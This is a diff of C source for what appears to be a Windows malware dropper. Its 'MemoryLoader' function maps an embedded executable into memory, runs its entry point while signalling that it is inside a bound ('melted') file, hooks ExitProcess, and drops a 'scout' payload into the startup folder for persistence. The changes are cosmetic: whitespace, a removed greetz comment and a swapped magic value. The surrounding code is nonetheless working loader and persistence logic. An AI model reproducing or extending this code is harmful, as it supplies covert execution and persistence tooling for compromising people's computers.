@@ -164,7 +164,7 @@ endmagicloop:
 	pData->GetShortPathNameW = pfn_GetShortPathNameW;
 	pData->PathAddBackslashW = pfn_PathAddBackslashW;
 	pData->PathAppendW = pfn_PathAppendW;
-
+	
 	pData->header = header;
 	// *** Resolve API END
 
@@ -467,9 +467,9 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 	// questo comunica allo scout che sta girando in un meltato e gli passa
 	// un puntatore a synchro che viene usata dalla hook di ExitProcess per sapere
 	// quando si puo' uscire
-	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint); // greetz to cod and busatt.
+	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
 	
-	ptrMain((HINSTANCE)0xf1c4babe, NULL, "", 0xa);
+	ptrMain((HINSTANCE)0x600db4b3, NULL, "", 0xa);
 	PWCHAR pScoutName = MyConf(&pData->header->synchro);	
 
 	// drop scout into startup folder
@@ -508,6 +508,7 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 	return CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
 }
 FUNCTION_END(MemoryLoader);
+
 
 /*
 __forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
@@ -552,6 +553,7 @@ __forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeade
 	}
 }
 */
+
 __forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
 {
 	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
